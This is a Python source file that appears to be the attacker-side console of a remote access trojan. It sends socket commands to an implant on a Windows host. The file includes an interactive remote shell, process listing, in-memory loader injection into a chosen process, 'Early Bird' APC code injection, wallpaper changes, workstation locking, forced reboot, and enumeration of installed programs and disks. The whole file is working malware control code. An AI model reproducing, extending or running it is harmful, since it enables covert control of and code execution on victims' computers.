import socket,threading,struct,os,argparse
from File_IO import Recv_All,Sort_Name


Exit_Thread = 0

def Shell_Proc(sock):
    global Exit_Thread
    while Exit_Thread != 1:
        try:
            text = sock.recv(1024)
            print(text.decode('utf-8'),end='')

        except ConnectionAbortedError as Err:
            print(str(Err));return 

        except ConnectionError as Err:
            print(str(Err));return 

        except socket.timeout as Err:
            continue



def Shell(sock):
    global Exit_Thread
    try:
        Exit_Thread = 0

        sock.send(int(21).to_bytes(4,'little'))

        status = struct.unpack_from("=LL",sock.recv(8))

        if(status[0] == 404):
            print('[-]Failed To Drop Shell.Error code: ',status[1]);return 0
        else:
            try:
                thd = threading.Thread(target=Shell_Proc,args=(sock,));thd.start()
                while 1:
                    inp = input()
                    if(inp != ''):
                        sock.send(inp.encode('utf-8')+b'\n')
                    if(inp == 'exit'):
                        Exit_Thread = 1
                        return
            except EOFError as Err:
                sock.send(b'exit\n');Exit_Thread = 1;return 0
            except KeyboardInterrupt as Err:
                sock.send(b'exit\n');Exit_Thread = 1;return 0


    except struct.error as Err:
        print(str(Err));return 0

    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404

    except socket.timeout as Err:
        print(str(Err));return 404


def List_Process(sock):
    try:
        sock.send(int(22).to_bytes(4,'little'))
        print('Process id\tParent id\tThread(s)\tFile Name')
        print('----------\t----------\t--------\t---------')
        while 1:
            ret_val = int.from_bytes(bytes=sock.recv(4),byteorder='little')

            if(ret_val == 404):
                reason = int.from_bytes(bytes=sock.recv(4),byteorder='little')
                print('[-]Failed TO List Process. Error code : ',reason);return 0

            elif(ret_val == 200):
                data = struct.unpack_from('=LLL260s',Recv_All(sock,272))
                print(data[0],'\t\t',data[1],'\t\t',data[2],'\t\t',Sort_Name(data[3]))
            else:
                return 0

    except struct.error as Err:
        print(str(Err));return 0

    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404

    except socket.timeout as Err:
        print(str(Err));return 404                     


def In_memory_exec(sock,pid,file_name):
    file = None
    try:
        pid = int(pid)
        file = open(file_name,'rb')
        size = os.path.getsize(file_name)
        sock.send(int(23).to_bytes(4,'little')+pid.to_bytes(4,'little')+size.to_bytes(4,'little'))

        while 1:
            ret = int.from_bytes(bytes=sock.recv(4),byteorder='little')
            if (ret == 3):
                print('[*]Sending file')
                sock.sendfile(file);print("[*]File In Sent")
            elif (ret == 404):
                err_code = int.from_bytes(bytes=sock.recv(4),byteorder='little')
                print('[-]Error Occured . Error Code ',err_code)
                return 0
            elif (ret == 200):
                print('[*]Loader Execution Successful');return                    
    except ValueError as Err:
        print("[-]Please Provice Valid process ID - "+str(Err));return
    
    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404

    except socket.timeout as Err:
        print(str(Err));return 404 

    except OSError as Err:
        print('[-]'+str(Err));return
            
    finally:
        if(file!=None):
            file.close()


def Early_Bird(sock,path,file_name):
    file = None
    try:
        file = open(file_name,'rb')
        size = os.path.getsize(file_name)
        sock.send(int(24).to_bytes(4,'little')+size.to_bytes(4,'little')+path.encode('utf-8'))

        while 1:
            ret = int.from_bytes(bytes=sock.recv(4),byteorder='little')
            if (ret == 3):
                print('[*]Sending file')
                sock.sendfile(file)
                print("[*]File In Sent")
            elif (ret == 404):
                err_code = int.from_bytes(bytes=sock.recv(4),byteorder='little')
                print('[-]Error Occured . Error Code ',err_code)
                return 0
            elif (ret == 200):
                print('[*]Loader Execution Successful');return
    
    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404

    except socket.timeout as Err:
        print(str(Err));return 404 

    except OSError as Err:
        print('[-]'+str(Err));return
            
    finally:
        if(file!=None):
            file.close()  



def Change_Wallpaper(sock,path):
    if(path=='') or (path==' '):
        print("[-]Invalid Path");return

    try:
        sock.send(int(25).to_bytes(4,'little')+path.encode('utf-8'))
        status = struct.unpack_from("=LL",sock.recv(8))

        if(status[0]==404):
            print("[-]Failed To Change Wallpaper.Error Code : ",status[1])
        else:
            print("[+]Wallpaper Changed Successfully")    

    except struct.error as Err:
        print(str(Err));return 0

    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404

    except socket.timeout as Err:
        print(str(Err));return 404


def LockWindow(sock):
    try:
        sock.send(int(26).to_bytes(4,'little'))
        status = struct.unpack_from("=LL",sock.recv(8))

        if(status[0] == 404):
            print("LockWorkStation() Function Failed.Error Code: ",status[1])
        else:
            print("LockWorkStation() Function Successful")

    except struct.error as Err:
        print(str(Err));return 0

    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404

    except socket.timeout as Err:
        print(str(Err));return 404


def reboot (sock,args):
    arg_parse = argparse.ArgumentParser()
    arg_parse.add_argument('--timeout',type = int ,default = 5)
    arg_parse.add_argument('--forced',type = int ,default = True)
    arg_parse.add_argument('--restart',type = int ,default = False)
    arg_parse.add_argument('--msg',type = str , default = '')

    try:
        arg = arg_parse.parse_args(args)
        option = struct.pack("=LHH",arg.timeout,arg.forced,arg.restart)

        if(arg.msg != ''):
            if(len(arg.msg)>260):
                print('[-]Maximum Character 260');return
            else:
                option += arg.msg.encode('utf-8')

        sock.send(int(27).to_bytes(4,'little')+option)

        status = struct.unpack_from("=LL",sock.recv(8))

        if(status[0] == 404):
            print("InitiateSystemShutdownA() Function Failed.Error Code: ",status[1])
        else:
            print("InitiateSystemShutdownA() Function Successful")
    
    except struct.error as Err:
        print(str(Err));return 0

    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404

    except socket.timeout as Err:
        print(str(Err));return 404

    except:
        print("[!]Probrlem in Agrument Parsing");return    



def List_Installed(sock):
    try:
        sock.send(int(28).to_bytes(4,'little'))

        while 1:
            ret = int.from_bytes(bytes=sock.recv(4),byteorder='little')
            if(ret == 404):
                print("[-]Failed To List Installed App.Error Code : ",int.from_bytes(bytes=sock.recv(4),byteorder='little'))
                return

            elif (ret == 200):
                return int.from_bytes(bytes=sock.recv(4),byteorder='little')

            else:
                Program_name = Sort_Name(Recv_All(sock,ret))
                print('[+]'+Program_name)

    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404

    except socket.timeout as Err:
        print(str(Err));return 404


def List_Disk(sock):
    Disk_type = {0 :'DRIVE_UNKNOWN' , 1:'DRIVE_NO_ROOT_DIR' , 2:'DRIVE_REMOVABLE' , 3:'DRIVE_FIXED' , 4:'DRIVE_REMOTE' , 5:'DRIVE_CDROM' , 6:'DRIVE_RAMDISK'}
    try:
        sock.send(int(29).to_bytes(4,'little'))
        #print('Drive\t\t\tSectorsPerCluster\t\t\tBytesPerSector\t\t\tNumberOfFreeClusters\t\t\tTotalNumberOfClusters\tGetDiskFreeSpaceA() Failed')
        #print('-----\t\t\t-----------------\t\t\t--------------\t\t\t--------------------\t\t\t---------------------\t---------------------------')
        while 1:
            ret = int.from_bytes(bytes=sock.recv(4),byteorder='little')
            if(ret == 404):
                print("[-]Failed To List Disk.Error Code : ",int.from_bytes(bytes=sock.recv(4),byteorder='little'))
                return

            elif (ret == 200):
                return

            else:
                drive_info = struct.unpack_from("=4sLLLLL",Recv_All(sock,24))
                
                func_status = ''

                if(drive_info[1]!=0):
                    func_status = "(Yes.Error code "+str(drive_info[1])+')'
                else:
                    func_status = 'No'

                print('Drive=',Sort_Name(drive_info[0]),'\tDisk Type=',Disk_type[ret],'\tSectorsPerCluster=',drive_info[2],'\tBytesPerSector=',drive_info[3],'\tNumberOfFreeClusters=',drive_info[4],'\tTotalNumberOfClusters=',drive_info[5],'\tGetDiskFreeSpaceA() Failed=',func_status)    


    except struct.error as Err:
        print(str(Err));return 0
        
    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404

    except socket.timeout as Err:
        print(str(Err));return 404      